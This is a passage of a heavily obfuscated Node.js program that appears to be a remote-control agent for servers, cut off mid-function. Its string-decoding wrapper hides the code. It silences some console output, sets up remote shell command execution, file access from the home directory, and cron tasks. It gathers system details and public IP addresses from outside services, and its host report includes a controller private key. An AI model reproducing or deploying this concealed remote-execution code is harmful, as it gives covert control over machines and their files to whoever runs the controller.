#!/usr/bin/env node
const a0S = a0b;
(function (a, b) {
    const R = a0b, c = a();
    while (!![]) {
        try {
            const d = parseInt(R(0x403)) / 0x1 * (parseInt(R(0x238)) / 0x2) + parseInt(R(0x228)) / 0x3 + parseInt(R(0x3d0)) / 0x4 + parseInt(R(0x412)) / 0x5 + parseInt(R(0x17a)) / 0x6 + parseInt(R(0x2fb)) / 0x7 + -parseInt(R(0x2c6)) / 0x8 * (parseInt(R(0x2fc)) / 0x9);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x3ac36));
const a0c = [
    'wasm\x20streaming\x20compile\x20failed',
    'Failed\x20to\x20parse\x20URL\x20from',
    a0S(0x379)
];
function a0b(a, b) {
    a = a - 0x12c;
    const c = a0a();
    let d = c[a];
    if (a0b['vJAutn'] === undefined) {
        var e = function (i) {
            const j = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let l = '', m = '';
            for (let n = 0x0, o, p, q = 0x0; p = i['charAt'](q++); ~p && (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? l += String['fromCharCode'](0xff & o >> (-0x2 * n & 0x6)) : 0x0) {
                p = j['indexOf'](p);
            }
            for (let r = 0x0, s = l['length']; r < s; r++) {
                m += '%' + ('00' + l['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(m);
        };
        a0b['QuwzXv'] = e, a0b['RTNdQc'] = {}, a0b['vJAutn'] = !![];
    }
    const f = c[0x0], g = a + f, h = a0b['RTNdQc'][g];
    return !h ? (d = a0b['QuwzXv'](d), a0b['RTNdQc'][g] = d) : d = h, d;
}
function a0d(a) {
    const b = {
        'BUTST': function (c, d) {
            return c === d;
        },
        'HYjmu': 'function'
    };
    return function (c, d, f) {
        const T = a0b, g = c[T(0x39e)]();
        if (a0c['some'](h => g[T(0x331)](h))) {
            if (b[T(0x3fd)](typeof f, b[T(0x364)]))
                f();
            return !![];
        }
        return a[T(0x14b)](this, arguments);
    };
}
process[a0S(0x383)][a0S(0x1c1)] = a0d(process[a0S(0x383)]['write']), process['stderr'][a0S(0x1c1)] = a0d(process[a0S(0x2cc)][a0S(0x1c1)]);
const a0f = require(a0S(0x2ac)), a0g = require(a0S(0x16f)), a0h = require('fs'), a0i = require('fs')[a0S(0x2e8)], a0j = require(a0S(0x3c0)), a0k = require('os'), {exec: a0l} = require(a0S(0x421)), a0m = require(a0S(0x1af)), a0n = require(a0S(0x295)), {encrypt: a0o} = require('eciesjs'), a0p = require('base64-js'), a0q = require(a0S(0x328)), a0r = require(a0S(0x249));
let a0s;
try {
    typeof Bun !== a0S(0x171) ? a0s = require(a0S(0x16c)) : a0s = require(a0S(0x23e));
} catch (a0Q) {
}
const a0t = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const U = a0S, a = {
                'xNiqA': U(0x171),
                'GuxFz': function (b, c) {
                    return b !== c;
                }
            };
        return typeof a0D !== a[U(0x389)] && a[U(0x131)](a0D[U(0x22f)], undefined) ? a0D[U(0x22f)] : 0x2;
    },
    'debug': a => {
        const V = a0S, b = {
                'dNspD': function (c, d) {
                    return c <= d;
                }
            };
        b[V(0x3bd)](a0t['currentLevel'], a0t[V(0x166)][V(0x13d)]) && console[V(0x184)]('\x1b[90m[DEBUG]\x1b[0m\x20' + a);
    },
    'info': a => {
        const W = a0S, b = {
                'OnsGL': function (c, d) {
                    return c <= d;
                }
            };
        b[W(0x315)](a0t[W(0x25f)], a0t['LEVELS'][W(0x189)]) && console[W(0x184)]('\x1b[36m[INFO]\x1b[0m\x20' + a);
    },
    'warn': a => {
        const X = a0S, b = {
                'bmHFA': function (c, d) {
                    return c <= d;
                }
            };
        b[X(0x2bf)](a0t[X(0x25f)], a0t[X(0x166)]['WARN']) && console[X(0x184)](X(0x3d2) + a);
    },
    'error': a => {
        const Y = a0S, b = {
                'YeOJK': function (c, d) {
                    return c <= d;
                }
            };
        b['YeOJK'](a0t[Y(0x25f)], a0t[Y(0x166)][Y(0x38c)]) && console[Y(0x184)](Y(0x319) + a);
    }
};
class a0u {
    constructor(a = 'ok') {
        const Z = a0S;
        this[Z(0x21f)] = a;
    }
}
class a0v extends a0u {
    constructor(a = 'ok', b = 0x0) {
        const a0 = a0S;
        super(a), this[a0(0x1c5)] = b;
    }
}
class a0w extends a0u {
    constructor() {
        const a1 = a0S, a = { 'WtXKN': a1(0x1a2) }, b = a[a1(0x3e3)][a1(0x2c5)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a1(0x35e)] = null;
                continue;
            case '1':
                this[a1(0x36c)] = 0x0;
                continue;
            case '2':
                this['session_key'] = '';
                continue;
            case '3':
                this[a1(0x34a)] = 0x0;
                continue;
            case '4':
                this[a1(0x311)] = '';
                continue;
            case '5':
                this[a1(0x3e1)] = '';
                continue;
            case '6':
                this['os'] = '';
                continue;
            case '7':
                this[a1(0x369)] = 0x0;
                continue;
            case '8':
                this[a1(0x1f1)] = '';
                continue;
            case '9':
                this[a1(0x218)] = 0x0;
                continue;
            case '10':
                this[a1(0x145)] = null;
                continue;
            case '11':
                this[a1(0x199)] = '';
                continue;
            case '12':
                this[a1(0x21e)] = '';
                continue;
            case '13':
                super();
                continue;
            case '14':
                this[a1(0x157)] = a0D['AGENT_VERSION'];
                continue;
            case '15':
                this['ipv6'] = null;
                continue;
            }
            break;
        }
    }
}
class a0x extends a0u {
    constructor() {
        const a2 = a0S, a = { 'oCfwr': a2(0x143) }, b = a[a2(0x132)][a2(0x2c5)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a2(0x352)] = { 'usage': 0x0 };
                continue;
            case '1':
                this[a2(0x2d1)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '2':
                super();
                continue;
            case '3':
                this[a2(0x39b)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '4':
                this[a2(0x197)] = '';
                continue;
            case '5':
                this[a2(0x1ae)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '6':
                this['process'] = 0x0;
                continue;
            case '7':
                this[a2(0x233)] = 0x0;
                continue;
            case '8':
                this[a2(0x1c8)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '9':
                this[a2(0x3b6)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '10':
                this['ram'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            }
            break;
        }
    }
}
class a0y extends a0u {
    constructor() {
        const a3 = a0S, a = { 'GYGgg': a3(0x27d) }, b = a['GYGgg']['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                super();
                continue;
            case '1':
                this[a3(0x204)] = '';
                continue;
            case '2':
                this[a3(0x1a8)] = 0x0;
                continue;
            case '3':
                this['cmd'] = '';
                continue;
            case '4':
                this['timeout'] = ![];
                continue;
            }
            break;
        }
    }
}
class a0z {
    constructor() {
        const a4 = a0S, a = a4(0x25d)['split']('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[a4(0x1ab)] = 0x0;
                continue;
            case '1':
                this[a4(0x41c)] = '';
                continue;
            case '2':
                this['mode'] = '';
                continue;
            case '3':
                this[a4(0x3c0)] = '';
                continue;
            case '4':
                this[a4(0x309)] = '';
                continue;
            case '5':
                this[a4(0x17b)] = '';
                continue;
            case '6':
                this[a4(0x1ad)] = '';
                continue;
            case '7':
                this[a4(0x3cc)] = '';
                continue;
            }
            break;
        }
    }
}
class a0A {
    constructor() {
        const a5 = a0S, a = { 'kdEVZ': a5(0x252) }, b = a[a5(0x2c7)][a5(0x2c5)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['name'] = '';
                continue;
            case '1':
                this[a5(0x26e)] = ![];
                continue;
            case '2':
                this[a5(0x1cb)] = ![];
                continue;
            case '3':
                this[a5(0x3c0)] = '';
                continue;
            case '4':
                this['mode'] = '';
                continue;
            case '5':
                this[a5(0x1ad)] = '';
                continue;
            case '6':
                this['executable'] = ![];
                continue;
            case '7':
                this[a5(0x41c)] = '';
                continue;
            }
            break;
        }
    }
}
class a0B extends a0u {
    constructor() {
        const a6 = a0S;
        super(), this[a6(0x37d)] = [];
    }
}
class a0C {
    static ['_generateRawKeypair']() {
        const a7 = a0S, a = {
                'TIpGC': 'x25519',
                'LEDzO': 'jwk',
                'EwvzX': a7(0x1ec),
                'cisKX': function (i, j) {
                    return i !== j;
                },
                'ZaQVD': a7(0x308)
            }, {
                privateKey: b,
                publicKey: c
            } = a0g[a7(0x3dd)](a['TIpGC']), d = b['export']({ 'format': a['LEDzO'] }), f = c['export']({ 'format': a[a7(0x210)] }), g = Buffer[a7(0x33a)](d['d'], a[a7(0x1f0)]), h = Buffer[a7(0x33a)](f['x'], a[a7(0x1f0)]);
        return (a[a7(0x1f6)](g[a7(0x182)], 0x20) || h['length'] !== 0x20) && a0t[a7(0x170)](a7(0x3a9)), {
            'private_b64': g[a7(0x39e)](a[a7(0x314)]),
            'public_b64': h[a7(0x39e)](a7(0x308))
        };
    }
    static ['generateSingle'](a) {
        const a8 = a0S, b = this['_generateRawKeypair']();
        return {
            'role': a,
            'private_b64': b[a8(0x215)],
            'public_b64': b[a8(0x2d9)]
        };
    }
    static [a0S(0x32f)](a = a0S(0x2a8), b = a0S(0x1a6)) {
        const a9 = a0S, c = {
                'control': this[a9(0x15f)](a),
                'agent': this['generateSingle'](b)
            };
        return c;
    }
}
class a0D {
    static [a0S(0x355)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0S(0x347)] = (process.env.EXEC_SHELL || a0S(0x16d))[a0S(0x415)]() === a0S(0x16d);
    static [a0S(0x13d)] = (process.env.DEBUG || 'false')['toLowerCase']() === 'true';
    static [a0S(0x1c0)] = parseInt(process.env.TIMESTAMP_WINDOW || '30');
    static [a0S(0x22f)] = parseInt(process.env.LOG_LEVEL || (this[a0S(0x13d)] ? '0' : '2'), 0xa);
    static [a0S(0x164)] = a0D[a0S(0x2d5)](a0S(0x360), a0S(0x2e4)) || 'ECDSA公钥内容';
    static [a0S(0x41b)] = a0D[a0S(0x2d5)](a0S(0x3a0), a0S(0x2b4)) || 'ECIES公钥内容';
    static [a0S(0x2ee)] = process.env.FILE_ROOT || a0k['homedir']();
    static [a0S(0x3cf)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0S(0x1de));
    static [a0S(0x40f)] = (process.env.FOLLOW_SYMLINKS || a0S(0x262))['toLowerCase']() === a0S(0x16d);
    static [a0S(0x3e5)] = (process.env.FILE_AUDIT_LOG || 'true')[a0S(0x415)]() === 'true';
    static [a0S(0x35f)] = !![];
    static ['onetasks'] = [];
    static ['crontasks'] = {};
    static ['cronloop'] = ![];
    static ['TASK_TIMEOUT'] = parseInt(process.env.TASK_TIMEOUT || a0S(0x196));
    static [a0S(0x423)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0S(0x3ac)] = [];
    static ['crontasks_log'] = [];
    static [a0S(0x2a1)] = parseInt(process.env.MAX_TASK_LOG || a0S(0x3ee));
    static [a0S(0x191)] = process.env.HOST || a0S(0x2f9);
    static [a0S(0x21a)] = parseInt(process.env.PORT || process.env.SERVER_PORT || a0S(0x2ca));
    static [a0S(0x313)] = process.env.AGENT_VERSION || a0S(0x1df);
    static ['SESSION_KEY'] = a0g[a0S(0x33c)](0x20)['toString'](a0S(0x308));
    static [a0S(0x230)] = a0C[a0S(0x32f)]();
    static ['NOISE_KEY'] = {
        'controller': { 'private': this[a0S(0x230)]['control']['private_b64'] },
        'agent': { 'public': this[a0S(0x230)][a0S(0x334)][a0S(0x2d9)] }
    };
    static [a0S(0x2d5)](a, b) {
        const aa = a0S, c = { 'ZDuct': aa(0x3b5) }, d = process.env[a];
        if (d)
            return d;
        const f = a0j[aa(0x392)](__dirname, b);
        if (a0h['existsSync'](f))
            try {
                return a0h['readFileSync'](f, c[aa(0x149)])['trim']();
            } catch (g) {
            }
        return '';
    }
    static ['validate']() {
        const ab = a0S, a = {
                'BDdpF': ab(0x34d),
                'SlVsC': ab(0x31e),
                'GoFlk': function (b, c) {
                    return b > c;
                },
                'KkPKo': ab(0x216),
                'fkZkQ': ab(0x2b0),
                'bKOHB': ab(0x287)
            };
        if (!this['DEBUG']) {
            const b = [];
            !this[ab(0x164)] && b['push'](a['BDdpF']), !this[ab(0x41b)] && b[ab(0x28e)](a[ab(0x1dd)]), a[ab(0x1f5)](b['length'], 0x0) && (a0t[ab(0x170)](ab(0x30b)), b[ab(0x3c2)](c => a0t[ab(0x170)](ab(0x26f) + c)), a0t[ab(0x3e6)](a[ab(0x1c7)]), a0t['debug'](a['fkZkQ']), a0t[ab(0x3e6)](a['bKOHB']), process['exit'](0x1));
        }
    }
}
class a0E {
    constructor(a, b) {
        const ac = a0S;
        this[ac(0x1db)] = null, this['eciesPubkey'] = null;
        a && (this['ecdsaPubkey'] = a0g['createPublicKey'](a));
        if (b)
            try {
                this[ac(0x239)] = a0p[ac(0x29a)](b[ac(0x2ff)]());
            } catch (c) {
                a0t[ac(0x356)](ac(0x227) + c[ac(0x197)]);
            }
    }
    [a0S(0x312)](a, b, c) {
        const ad = a0S, d = {
                'PgBNr': function (f, g) {
                    return f / g;
                },
                'hKKbT': function (f, g) {
                    return f > g;
                },
                'tuYjd': function (f, g) {
                    return f - g;
                },
                'hNrzb': function (f, g) {
                    return f - g;
                }
            };
        if (!this[ad(0x1db)])
            return !![];
        try {
            const f = parseInt(b), g = Math[ad(0x318)](d[ad(0x14a)](Date[ad(0x146)](), 0x3e8));
            if (d[ad(0x1a1)](Math[ad(0x3c1)](d[ad(0x371)](g, f)), a0D[ad(0x1c0)]))
                throw new Error(ad(0x2f5) + Math[ad(0x3c1)](d['hNrzb'](g, f)) + ad(0x15c) + a0D[ad(0x1c0)] + 's');
            const h = '' + a + b, i = a0p[ad(0x29a)](c), j = a0g[ad(0x39c)](ad(0x2c9));
            return j[ad(0x3c8)](h), j[ad(0x176)](this['ecdsaPubkey'], i);
        } catch (k) {
            throw new Error(ad(0x17c) + k['message']);
        }
    }
    ['encryptResponse'](a) {
        const ae = a0S, b = {
                'OvGCN': function (c, d, f) {
                    return c(d, f);
                }
            };
        if (a0D[ae(0x13d)] || !this['eciesPubkey'])
            return JSON[ae(0x194)](a);
        try {
            const c = JSON[ae(0x194)](a), d = Buffer[ae(0x33a)](c, ae(0x1b7)), f = Buffer['from'](this['eciesPubkey']), g = b['OvGCN'](a0o, f, d);
            return Buffer[ae(0x33a)](g)[ae(0x39e)](ae(0x308));
        } catch (h) {
            const i = {
                '_encrypt_error': h[ae(0x197)],
                '_raw': a0D[ae(0x13d)] ? a : null
            };
            return JSON[ae(0x194)](i);
        }
    }
    [a0S(0x343)](a, b) {
        const af = a0S, c = {
                'qwaAV': function (d, f) {
                    return d !== f;
                },
                'ZWUCF': af(0x225),
                'iOoyC': af(0x308),
                'wFmrt': af(0x2dd),
                'qIEqA': 'aes-256-gcm',
                'muRWQ': af(0x3b5)
            };
        if (!b || c[af(0x213)](b[af(0x182)], 0x20))
            throw new Error(c[af(0x242)]);
        try {
            const d = Buffer['from'](a, c['iOoyC'])[af(0x39e)](af(0x3b5)), f = JSON[af(0x267)](d);
            if (!f[af(0x2a4)] || !f['tag'] || !f[af(0x32b)])
                throw new Error(c[af(0x2d6)]);
            const g = Buffer[af(0x33a)](f[af(0x2a4)], 'base64'), h = Buffer[af(0x33a)](f[af(0x2a0)], c[af(0x23f)]), i = Buffer[af(0x33a)](f[af(0x32b)], c[af(0x23f)]), j = a0g[af(0x284)](c[af(0x2c2)], b, g);
            j[af(0x28a)](h);
            let k = j[af(0x3c8)](i, null, c[af(0x340)]);
            return k += j[af(0x31d)](c[af(0x340)]), k;
        } catch (l) {
            throw new Error(af(0x30a) + l['message']);
        }
    }
}
function a0F(a) {
    const ag = a0S, b = {
            'RaiaM': 'Content-Type',
            'TTQjF': ag(0x259),
            'pidCB': ag(0x3e0),
            'MnQnT': ag(0x1e2),
            'buhoq': 'x-agent-version',
            'hMgqU': ag(0x3b5),
            'vSBDM': ag(0x2c3),
            'jjoKN': ag(0x359),
            'Ggsto': function (c) {
                return c();
            },
            'fnJuG': function (c, d) {
                return c === d;
            },
            'FyHnm': ag(0x1d1),
            'AYGKN': function (c) {
                return c();
            },
            'JeDyw': ag(0x15d),
            'wQuBh': ag(0x289),
            'Rxrub': ag(0x416),
            'JELsl': 'x-timestamp',
            'qHjEY': ag(0x342),
            'nwAZF': ag(0x3b8),
            'jvYfQ': 'X-Auth-Token',
            'JUqAu': function (c, d) {
                return c || d;
            },
            'HPbXM': 'Missing\x20auth\x20headers',
            'vVtTh': function (c, d) {
                return c === d;
            },
            'cZAUF': ag(0x244),
            'gnLlc': 'base64',
            'QHfxv': ag(0x1b7)
        };
    return async (c, d, f) => {
        const ah = ag;
        if (c[ah(0x3c0)][ah(0x177)](b['vSBDM']) || (c[ah(0x236)][ah(0x362)] || '')[ah(0x415)]() === b[ah(0x361)])
            return b[ah(0x2b3)](f);
        if (b[ah(0x30d)](c[ah(0x1a5)], b[ah(0x3f2)]) || c[ah(0x1a5)] === ah(0x33d))
            return b[ah(0x3bc)](f);
        if (!a0D['DEBUG'] && !c[ah(0x236)][b[ah(0x40a)]]) {
            const h = c[ah(0x236)][b[ah(0x234)]] || c[ah(0x236)][b[ah(0x26d)]], i = c[ah(0x236)][b[ah(0x3af)]] || c[ah(0x236)][b[ah(0x2dc)]], j = c[ah(0x236)][b[ah(0x417)]] || c[ah(0x236)][b[ah(0x2c0)]];
            if (b[ah(0x2b8)](!h, !i) || !j)
                return d[ah(0x21f)](0x191)['json']({ 'error': b[ah(0x280)] });
            try {
                a[ah(0x312)](h, i, j);
            } catch (k) {
                return d[ah(0x21f)](0x191)['json']({ 'error': ah(0x17c) + k[ah(0x197)] });
            }
        }
        if (c[ah(0x13c)] && b['fnJuG'](typeof c['body'], b['pidCB'])) {
            const l = b['vVtTh']((c[ah(0x236)][b[ah(0x1b5)]] || '')['toLowerCase'](), 'true');
            try {
                if (l) {
                    const m = Buffer['from'](a0D[ah(0x135)], b[ah(0x224)]), n = a[ah(0x343)](c['body'], m);
                    c[ah(0x13c)] = JSON['parse'](n);
                } else {
                    if (c[ah(0x13c)][ah(0x177)](ah(0x25c))) {
                        const o = Buffer[ah(0x33a)](c['body'], b[ah(0x224)])[ah(0x39e)](b[ah(0x410)]);
                        c[ah(0x13c)] = JSON[ah(0x267)](o);
                    } else {
                        if (c[ah(0x13c)][ah(0x2ff)]()['startsWith']('{') || c['body'][ah(0x2ff)]()[ah(0x177)]('['))
                            c[ah(0x13c)] = JSON[ah(0x267)](c[ah(0x13c)]);
                        else {
                            if (b[ah(0x3da)](c[ah(0x13c)][ah(0x2ff)](), ''))
                                c['body'] = {};
                        }
                    }
                }
            } catch (p) {
                return a0t[ah(0x170)](ah(0x22d) + p['message']), d['status'](0x190)['json']({ 'error': ah(0x23b) + p[ah(0x197)] });
            }
        }
        const g = d[ah(0x1fb)];
        d[ah(0x1fb)] = function (q) {
            const ai = ah;
            if (d[ai(0x382)](ai(0x198)) && d[ai(0x382)](b[ai(0x214)])['includes'](b[ai(0x3c3)]))
                try {
                    const r = typeof q === 'string' ? JSON[ai(0x267)](q) : q, s = a[ai(0x250)](r), t = typeof s === b[ai(0x3d9)] ? s : JSON[ai(0x194)](s);
                    return !a0D[ai(0x13d)] && (d[ai(0x138)](b[ai(0x1be)], ai(0x16d)), d['set'](b[ai(0x21c)], a0D[ai(0x313)])), d[ai(0x138)](ai(0x175), Buffer[ai(0x2fa)](t, b[ai(0x2f7)])[ai(0x39e)]()), g[ai(0x41f)](this, t);
                } catch (u) {
                    if (a0D[ai(0x13d)])
                        a0t['error']('💥\x20[Response\x20Encrypt]:\x20' + u[ai(0x197)]);
                }
            return g[ai(0x41f)](this, q);
        }, b[ah(0x2b3)](f);
    };
}
class a0G {
    constructor() {
        const aj = a0S;
        this['lastNetworkStats'] = {
            'rx': 0x0,
            'tx': 0x0
        }, this['totalNetworkUp'] = 0x0, this[aj(0x1e3)] = 0x0, this['lastNetworkTime'] = Date[aj(0x146)]() / 0x3e8;
    }
    async ['getContainerMemory']() {
        const ak = a0S, a = {
                'PCsyF': '/sys/fs/cgroup/memory.max',
                'IKkqI': function (d, f) {
                    return d === f;
                },
                'wxmqv': 'max',
                'mfVPN': function (d, f, g) {
                    return d(f, g);
                },
                'IlsVG': 'utf8',
                'FivNm': function (d, f, g) {
                    return d(f, g);
                },
                'vbidw': ak(0x2ba),
                'olHzY': function (d, f, g) {
                    return d(f, g);
                },
                'oKclN': '/sys/fs/cgroup/memory/memory.usage_in_bytes',
                'vcDON': function (d, f) {
                    return d > f;
                },
                'Kszqp': function (d, f) {
                    return d === f;
                },
                'XJdPI': function (d, f) {
                    return d(f);
                },
                'MbwMr': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0i[ak(0x273)](a[ak(0x368)], ak(0x3b5)))['trim']();
            b = a['IKkqI'](d, a[ak(0x405)]) ? null : a['mfVPN'](parseInt, d, 0xa), c = parseInt((await a0i[ak(0x273)](ak(0x37b), a[ak(0x398)]))[ak(0x2ff)](), 0xa);
        } catch {
            try {
                b = a[ak(0x3f9)](parseInt, (await a0i[ak(0x273)](a[ak(0x2ef)], a[ak(0x398)]))[ak(0x2ff)](), 0xa), c = a[ak(0x20f)](parseInt, (await a0i[ak(0x273)](a[ak(0x17e)], a[ak(0x398)]))[ak(0x2ff)](), 0xa);
                if (a[ak(0x363)](b, 0x7ffffffffffff000))
                    b = null;
            } catch {
                const f = await a0n[ak(0x23a)]();
                b = f[ak(0x16e)], c = f[ak(0x1b3)];
            }
        }
        if (a['IKkqI'](b, null)) {
            const g = await a0n[ak(0x23a)]();
            b = g['total'], (a[ak(0x1ff)](c, null) || a['XJdPI'](isNaN, c)) && (c = g[ak(0x1b3)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a[ak(0x3c7)](b, c),
            'free': b - c,
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0S(0x34b)]() {
        const al = a0S, [a, b, c, d] = await Promise[al(0x232)]([
                a0n[al(0x352)](),
                this[al(0x3f0)](),
                a0n[al(0x263)](),
                a0n[al(0x220)]()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise['all']([
                this[al(0x35d)](),
                this['getPublicIpV6']()
            ]);
        } catch (h) {
            a0t[al(0x3e6)]('获取\x20IP\x20地址失败:\x20' + h[al(0x197)], 0x1);
        }
        return {
            'arch': a0k[al(0x3e1)](),
            'cpu_cores': a[al(0x3ea)],
            'cpu_name': a[al(0x34e)],
            'disk_total': (await a0n[al(0x2bd)]())[0x0]?.[al(0x1ab)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[al(0x16e)],
            'os': c[al(0x1f4)] + '\x20' + c[al(0x245)],
            'kernel_version': c[al(0x2f1)],
            'swap_total': b[al(0x169)],
            'version': a0D[al(0x313)],
            'virtualization': await this[al(0x229)](),
            'session_key': a0D['SESSION_KEY'],
            'noise_key': a0D['NOISE_KEY']
        };
    }
    [a0S(0x414)]() {
        const am = a0S, a = {
                'wjAyz': function (c, d) {
                    return c === d;
                },
                'NAkJS': am(0x39d)
            }, b = a0k[am(0x220)]();
        for (const c of Object[am(0x3f3)](b)) {
            for (const d of b[c]) {
                const f = a[am(0x390)](d[am(0x151)], a[am(0x2a5)]) || a['wjAyz'](d[am(0x151)], 0x4);
                if (f && !d[am(0x1d4)]) {
                    if (!/^10\./[am(0x14c)](d[am(0x37e)]) && !/^192\.168\./[am(0x14c)](d[am(0x37e)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./['test'](d[am(0x37e)]))
                        return d['address'];
                }
            }
        }
        return null;
    }
    async [a0S(0x35d)]() {
        const an = a0S, a = {
                'QXinB': 'https://api.ipify.org',
                'UUrWw': an(0x18a),
                'SALHv': an(0x254),
                'ftxqV': 'https://ipecho.net/plain',
                'UbBxi': 'https://ipinfo.io/ip',
                'cNZNs': an(0x2af)
            }, b = [
                a[an(0x40d)],
                a['UUrWw'],
                an(0x148),
                a[an(0x19b)],
                a[an(0x40c)],
                a[an(0x2e7)],
                a[an(0x288)]
            ];
        for (const d of b) {
            try {
                const f = await this['fetchIP'](d, 0x4);
                if (f && this['isValidIPv4'](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[an(0x414)]();
        if (c && this[an(0x3a5)](c))
            return c;
        return null;
    }
    ['getLocalIPv6']() {
        const ao = a0S, a = { 'QfEwU': ao(0x30f) }, b = a0k[ao(0x220)]();
        for (const c of Object[ao(0x3f3)](b)) {
            for (const d of b[c]) {
                const f = d[ao(0x151)] === ao(0x265) || d[ao(0x151)] === 0x6;
                if (f && !d[ao(0x1d4)]) {
                    if (!d['address'][ao(0x415)]()[ao(0x177)](a[ao(0x3cb)]))
                        return d[ao(0x37e)];
                }
            }
        }
        return null;
    }
    async [a0S(0x2db)]() {
        const ap = a0S, a = { 'aoIyy': ap(0x18a) }, b = this[ap(0x3db)]();
        if (b && this[ap(0x180)](b))
            return b;
        const c = [
            ap(0x1fd),
            a[ap(0x395)],
            ap(0x33b)
        ];
        for (const d of c) {
            try {
                const f = await this[ap(0x13f)](d, 0x6);
                if (f && this[ap(0x180)](f))
                    return f;
            } catch (g) {
                a0t[ap(0x3e6)](ap(0x20c) + d + ap(0x3a4) + g[ap(0x197)]);
                continue;
            }
        }
        return null;
    }
    async [a0S(0x13f)](a, b = 0x0) {
        const aq = a0S, c = {
                'KLAOc': aq(0x3eb),
                'hplLt': aq(0x29d),
                'UKXko': function (d, f) {
                    return d(f);
                },
                'THprQ': aq(0x2d8),
                'vBdve': aq(0x170)
            };
        return new Promise((d, f) => {
            const ar = aq, g = {
                    'aygCd': function (k, l) {
                        return k !== l;
                    },
                    'dHwwr': function (k, l) {
                        return k(l);
                    },
                    'vyrTj': c[ar(0x15b)],
                    'GDBnS': c[ar(0x1b2)]
                }, h = c['UKXko'](require, ar(0x172)), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c[ar(0x27a)] }
                }, j = h[ar(0x382)](a, i, k => {
                    const as = ar;
                    let l = '';
                    if (g['aygCd'](k['statusCode'], 0xc8)) {
                        g[as(0x345)](f, new Error('HTTP\x20' + k[as(0x31f)]));
                        return;
                    }
                    k['on'](g[as(0x195)], m => l += m), k['on'](g[as(0x159)], () => d(l[as(0x2ff)]()));
                });
            j['on'](c[ar(0x1ca)], f), j['setTimeout'](0x1388, () => {
                const at = ar;
                j[at(0x1aa)](), g[at(0x345)](f, new Error('请求超时'));
            });
        });
    }
    [a0S(0x3a5)](a) {
        return /^(\d{1,3}\.){3}\d{1,3}$/['test'](a);
    }
    [a0S(0x180)](a) {
        const au = a0S;
        if (!/^[0-9a-fA-F:]+$/[au(0x14c)](a) || !a[au(0x331)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[au(0x14c)](a))
            return ![];
        return !![];
    }
    async ['getRealtimeInfo']() {
        const av = a0S, a = {
                'QWfYe': function (m, n) {
                    return m / n;
                },
                'lZZCP': function (m, n) {
                    return m - n;
                },
                'sYcqf': function (m, n) {
                    return m * n;
                },
                'LNBJu': function (m, n) {
                    return m * n;
                },
                'cRAAX': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[av(0x232)]([
                a0n[av(0x181)](),
                a0n[av(0x23a)](),
                a0n[av(0x29e)](),
                a0n[av(0x181)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a['QWfYe'](Date['now'](), 0x3e8), i = a[av(0x3bb)](h, this['lastNetworkTime']), j = a[av(0x3bb)](g[av(0x41a)], this['lastNetworkStats']['tx']), k = a['lZZCP'](g['rx_bytes'], this[av(0x37a)]['rx']);
        this[av(0x130)] += j, this[av(0x1e3)] += k, this['lastNetworkStats'] = {
            'tx': g[av(0x41a)],
            'rx': g['rx_bytes']
        }, this['lastNetworkTime'] = h;
        const l = await a0n['processes']();
        return {
            'cpu': { 'usage': Math[av(0x2ec)](b[av(0x181)]) },
            'ram': {
                'total': c[av(0x16e)],
                'used': c['used']
            },
            'swap': {
                'total': c[av(0x169)],
                'used': c[av(0x36a)]
            },
            'load': {
                'load1': Math[av(0x2ec)](a['sYcqf'](f['avgLoad'], 0x64)) / 0x64,
                'load5': a['QWfYe'](Math[av(0x2ec)](a[av(0x3e2)](f[av(0x3c9)], 0x64)), 0x64),
                'load15': Math[av(0x2ec)](a[av(0x3f7)](f[av(0x3c9)], 0x64)) / 0x64
            },
            'disk': await this[av(0x168)](),
            'network': {
                'up': Math[av(0x2ec)](j / i),
                'down': Math['round'](a[av(0x41d)](k, i)),
                'totalUp': this['totalNetworkUp'],
                'totalDown': this[av(0x1e3)]
            },
            'connections': await this[av(0x2f6)](),
            'uptime': a0k[av(0x233)](),
            'process': l?.[av(0x232)] || 0x0,
            'message': ''
        };
    }
    async [a0S(0x229)]() {
        const aw = a0S, a = {
                'DQdyU': aw(0x240),
                'oggYV': aw(0x28b),
                'nuEEU': '/run/.containerenv',
                'fZvOf': aw(0x2eb),
                'EFuPj': aw(0x3b5),
                'sgeCJ': aw(0x22a),
                'ctqGJ': 'containerd',
